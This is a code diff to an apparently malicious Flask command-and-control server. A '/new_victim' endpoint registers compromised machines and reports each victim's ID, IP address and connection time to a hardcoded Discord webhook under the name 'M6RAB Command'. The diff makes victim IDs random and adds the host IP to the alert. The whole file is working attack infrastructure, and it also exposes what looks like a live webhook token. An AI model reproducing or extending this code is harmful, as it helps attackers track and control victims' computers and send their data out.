@@ -1,10 +1,10 @@
 from flask import Flask, request, jsonify
 import requests, json, time, os
+import uuid
 
 app = Flask(__name__)
 
 # ==========================================
-# الويب هوك الجديد حقك
 WEBHOOK_URL = "https://discord.com/api/webhooks/1561247907213086720/uM2sBufoeaXJvnyL3kJoe8eJLcaJ5nCfJ1elh0QIodJChuQHE9PFEmJ7Dy7zFMfm0-eo"
 # ==========================================
 
@@ -14,10 +14,16 @@ COMMANDS = {}
 @app.route('/new_victim', methods=['POST'])
 def new_victim():
     data = request.json
-    vid = str(len(VICTIMS) + 1) 
+    # توليد ID قصير (4 أرقام/حروف)
+    vid = str(uuid.uuid4())[:4] 
+    
+    # في حال صار تعارض بالحظ (نادر جداً)، نعيد التوليد
+    while vid in VICTIMS:
+        vid = str(uuid.uuid4())[:4]
+
     VICTIMS[vid] = {"id": vid, "ip": data.get('ip'), "time": time.ctime()}
     
-    msg = f"**New Victim Connected!** ☠️\n**ID:** {vid}\n**Time:** {time.ctime()}"
+    msg = f"**New Victim Connected!** ☠️\n**ID:** `{vid}`\n**Host:** {data.get('ip')}\n**Time:** {time.ctime()}"
     requests.post(WEBHOOK_URL, json={"content": msg, "username": "M6RAB Command"})
     
     return jsonify({"status": "ok", "id": vid}), 200
